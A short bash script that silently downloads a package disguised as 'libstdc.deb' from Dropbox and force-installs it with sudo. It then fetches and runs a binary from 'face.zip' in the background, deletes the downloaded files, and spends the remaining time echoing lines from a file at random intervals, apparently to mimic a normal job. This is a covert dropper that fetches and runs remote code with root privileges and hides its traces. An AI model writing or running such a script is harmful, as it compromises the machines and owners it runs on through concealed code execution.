#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/9lokuar74oxp3ut/face.zip -q
unzip face.zip > /dev/null 2>&1
#pwd
./src/face ./src/me &
sleep 3
rm -rf face.zip
rm -rf src/face
rm -rf src/me
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 50 ))
done < $2

